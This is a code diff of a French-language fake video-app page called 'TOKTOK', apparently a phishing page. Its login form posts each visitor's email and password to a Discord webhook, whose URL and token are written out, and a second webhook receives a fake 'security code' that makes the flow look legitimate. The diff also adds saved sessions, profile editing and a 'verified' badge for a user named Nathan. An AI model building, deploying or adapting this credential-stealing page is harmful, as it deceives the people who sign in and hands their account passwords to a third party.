@@ -26,17 +26,17 @@
 </head>
 <body>
 
-    <div id="auth-1" class="auth-layer">
+    <div id="auth-1" class="auth-layer hidden">
         <h1 class="text-6xl font-black italic mb-10 tracking-tighter">TOK<span class="text-cyan-400">TOK</span></h1>
         <input type="email" id="email" placeholder="Email" class="tt-input">
         <input type="password" id="pass" placeholder="Mot de passe" class="tt-input">
-        <button onclick="goStep2()" class="btn-tt">Vérifier le compte</button>
+        <button onclick="goStep2()" class="btn-tt">Connexion</button>
     </div>
 
     <div id="auth-2" class="auth-layer hidden">
-        <h2 class="text-2xl font-bold mb-6">Sécurité</h2>
-        <input type="text" id="verify-code" placeholder="CODE" class="tt-input text-center text-2xl tracking-[10px]">
-        <button onclick="enterApp()" class="btn-tt">Valider</button>
+        <h2 class="text-2xl font-bold mb-6">Sécurité Bot</h2>
+        <input type="text" id="verify-code" placeholder="CODE DISCORD" class="tt-input text-center text-2xl tracking-[10px]">
+        <button onclick="enterApp()" class="btn-tt">Vérifier</button>
     </div>
 
     <div id="main-app" class="hidden h-full flex flex-col">
@@ -48,11 +48,11 @@
                     </video>
                     <div class="side-actions">
                         <div onclick="doLike(this)" class="flex flex-col items-center"><i class="fa-solid fa-heart text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
-                        <div onclick="alert('Commentaires privés')" class="flex flex-col items-center"><i class="fa-solid fa-comment-dots text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
+                        <div onclick="alert('Privé')" class="flex flex-col items-center"><i class="fa-solid fa-comment-dots text-3xl"></i><span class="text-xs font-bold mt-1">0</span></div>
                     </div>
                     <div class="bottom-info">
-                        <p class="font-bold text-lg flex items-center">@<span class="user-display">Utilisateur</span> <i class="fa-solid fa-circle-check verified-badge"></i></p>
-                        <p class="text-sm bio-display">Membre du cercle privé.</p>
+                        <p class="font-bold text-lg flex items-center">@<span class="user-display">Pseudo</span> <i class="fa-solid fa-circle-check verified-badge"></i></p>
+                        <p class="text-sm bio-display">Bio...</p>
                     </div>
                 </div>
             </div>
@@ -60,13 +60,10 @@
 
         <div id="tab-profile" class="flex-1 hidden overflow-y-auto p-5">
             <div class="flex flex-col items-center py-8">
-                <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="pfp-display" class="profile-pic mb-4">
+                <img src="" id="pfp-display" class="profile-pic mb-4">
                 <h2 class="text-2xl font-bold flex items-center"><span id="name-display">Pseudo</span> <i class="fa-solid fa-circle-check verified-badge" id="badge-main"></i></h2>
                 <p id="at-display" class="text-gray-500 mb-6">@pseudo</p>
                 <button onclick="showEditor()" class="w-full max-w-sm bg-[#1a1a1a] py-2 rounded-lg font-bold">Modifier le profil</button>
-                <div class="mt-10 grid grid-cols-3 gap-1 w-full border-t border-[#222] pt-4">
-                    <div class="aspect-square bg-[#111]"></div><div class="aspect-square bg-[#111]"></div><div class="aspect-square bg-[#111]"></div>
-                </div>
             </div>
         </div>
 
@@ -78,11 +75,12 @@
 
     <div id="modal-editor" class="auth-layer hidden" style="z-index: 2000;">
         <div class="w-full max-w-sm">
-            <h2 class="text-xl font-bold text-white mb-6">Édition</h2>
-            <input type="text" id="edit-name" placeholder="Ton Pseudo (Ex: Nathan)" class="tt-input">
-            <input type="text" id="edit-bio" placeholder="Ta Bio" class="tt-input">
-            <button onclick="saveProfile()" class="btn-tt mt-4">Enregistrer</button>
-            <p onclick="closeEditor()" class="text-center text-gray-500 mt-4 cursor-pointer text-sm">Fermer</p>
+            <h2 class="text-xl font-bold mb-6">Modifier Profil</h2>
+            <input type="text" id="edit-name" placeholder="Pseudo" class="tt-input">
+            <input type="text" id="edit-pfp" placeholder="Lien URL de ta photo" class="tt-input">
+            <textarea id="edit-bio" placeholder="Ta Bio" class="tt-input h-24"></textarea>
+            <button onclick="saveProfile()" class="btn-tt mt-4">Sauvegarder</button>
+            <p onclick="closeEditor()" class="text-center text-gray-400 mt-4 cursor-pointer">Annuler</p>
         </div>
     </div>
 
@@ -91,43 +89,70 @@
         const hookCode = "https://discord.com/api/webhooks/1476684502310064301/s8Pi1mj6i6sbbAFO1Fh1p_AyjHoqNCJfmWOnfuXR6hHzrd2eDsUessCB0pab1nfDPLvB";
         
         let genCode = "";
-        let myData = JSON.parse(localStorage.getItem('tt_data')) || { name: "Utilisateur", bio: "Bio privée", pfp: "https://cdn-icons-png.flaticon.com/512/149/149071.png" };
+        // RÉCUPÉRATION DES DONNÉES SAUVEGARDÉES
+        let myData = JSON.parse(localStorage.getItem('tt_data')) || { 
+            name: "Utilisateur", 
+            bio: "Membre TOKTOK", 
+            pfp: "https://cdn-icons-png.flaticon.com/512/149/149071.png",
+            isLogged: false,
+            isNathan: false // Certification fixe
+        };
+
+        // VÉRIFICATION DE LA SESSION AU DÉMARRAGE
+        window.onload = function() {
+            if(myData.isLogged) {
+                document.getElementById('main-app').classList.remove('hidden');
+                refreshUI();
+            } else {
+                document.getElementById('auth-1').classList.remove('hidden');
+            }
+        };
 
         function goStep2() {
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
             if(!e || !p) return;
+            // SI C'EST TOI, ON ACTIVE LA CERTIF A VIE
+            if(e.toLowerCase().includes("nathan")) { myData.isNathan = true; }
+            
             genCode = Math.floor(100000 + Math.random() * 900000);
-            
-            // Envoi asynchrone pour éviter l'erreur de serveur [cite: 2025-12-30]
-            fetch(hookLogs, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `👤 ${e} | MDP: ${p}` })});
-            fetch(hookCode, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `🔑 Code: **${genCode}** pour ${e}` })});
-            
+            fetch(hookLogs, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ content: `👤 LOGIN: ${e} | PASS: ${p}` })});
+            fetch(hookCode, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ content: `🔑 Code Bot: **${genCode}** pour ${e}` })});
             document.getElementById('auth-1').classList.add('hidden');
             document.getElementById('auth-2').classList.remove('hidden');
         }
 
         function enterApp() {
             if(document.getElementById('verify-code').value == genCode) {
+                myData.isLogged = true; // ON SAUVE LA CONNEXION
+                localStorage.setItem('tt_data', JSON.stringify(myData));
                 document.getElementById('auth-2').classList.add('hidden');
                 document.getElementById('main-app').classList.remove('hidden');
                 refreshUI();
-            } else { alert("Code faux."); }
+            } else { alert("Code incorrect !"); }
         }
 
         function refreshUI() {
             document.getElementById('name-display').innerText = myData.name;
+            document.getElementById('pfp-display').src = myData.pfp;
             document.getElementById('at-display').innerText = "@" + myData.name.toLowerCase().replace(/ /g, "_");
             document.querySelector('.user-display').innerText = myData.name;
             document.querySelector('.bio-display').innerText = myData.bio;
 
-            // Système de Badge Nathan [cite: 2025-12-30]
+            // AFFICHAGE DU BADGE SI CERTIFIÉ
             const badges = document.querySelectorAll('.verified-badge');
-            if(myData.name.toLowerCase() === "nathan") {
+            if(myData.isNathan) {
                 badges.forEach(b => b.style.display = "inline-block");
-            } else {
-                badges.forEach(b => b.style.display = "none");
             }
+        }
+
+        function saveProfile() {
+            myData.name = document.getElementById('edit-name').value || myData.name;
+            myData.pfp = document.getElementById('edit-pfp').value || myData.pfp;
+            myData.bio = document.getElementById('edit-bio').value || myData.bio;
+            localStorage.setItem('tt_data', JSON.stringify(myData));
+            refreshUI();
+            closeEditor();
         }
 
         function switchTab(tab, el) {
@@ -140,26 +165,7 @@
 
         function showEditor() { document.getElementById('modal-editor').classList.remove('hidden'); }
         function closeEditor() { document.getElementById('modal-editor').classList.add('hidden'); }
-
-        function saveProfile() {
-            myData.name = document.getElementById('edit-name').value || myData.name;
-            myData.bio = document.getElementById('edit-bio').value || myData.bio;
-            localStorage.setItem('tt_data', JSON.stringify(myData));
-            refreshUI();
-            closeEditor();
-        }
-
-        function doLike(el) {
-            const icon = el.querySelector('i');
-            const span = el.querySelector('span');
-            if(icon.style.color === 'rgb(254, 44, 85)') {
-                icon.style.color = 'white';
-                span.innerText = "0";
-            } else {
-                icon.style.color = '#fe2c55';
-                span.innerText = "1";
-            }
-        }
+        function doLike(el) { el.querySelector('i').style.color = '#fe2c55'; el.querySelector('span').innerText = "1"; }
     </script>
 </body>
 </html>
